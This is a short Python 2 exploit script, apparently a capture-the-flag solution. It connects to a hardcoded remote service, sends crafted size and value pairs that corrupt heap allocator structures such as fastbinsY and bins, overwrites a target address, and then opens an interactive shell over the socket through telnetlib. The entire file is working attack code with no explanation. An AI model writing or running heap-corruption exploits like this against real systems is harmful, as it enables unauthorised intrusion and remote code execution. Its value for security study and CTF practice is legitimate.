import socket
from struct import pack,unpack
from ctypes import c_uint32
import telnetlib,time



LOCAL = ('139.59.241.76',31335)
BUFFER = 4096



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=0):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_



s.send('00000127')

remain = 127 / 8

for i in range(remain-(2*4)):
    size_ = c_uint32(0)
    payload = ""
    payload += pack('<I',size_.value)
    payload += pack('<I',0)
    s.send(payload)

def write(size_,value):
    global remain
    size_ = c_uint32(size_)
    payload = ""
    payload += pack('<I',size_.value)
    payload += pack('<I',value & 0xffffffff)
    s.send(payload)
    size_ = c_uint32(size_.value + 4)
    payload = ""
    payload += pack('<I',size_.value)
    payload += pack('<I',value >> 32)
    s.send(payload)

fastbinsY = -2200
bins = -2104
system_size = -32
top = bins - 16


write(fastbinsY+(8*5),0x6020a5-8)
write(1,0x90909090)
write(1,0x90909090)
write(1,0x90909090)

time.sleep(2)
#raw_input("?")
s.send("00000096")
payload = "a"*(10*8) +"bbbb"


s.send(payload)


t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
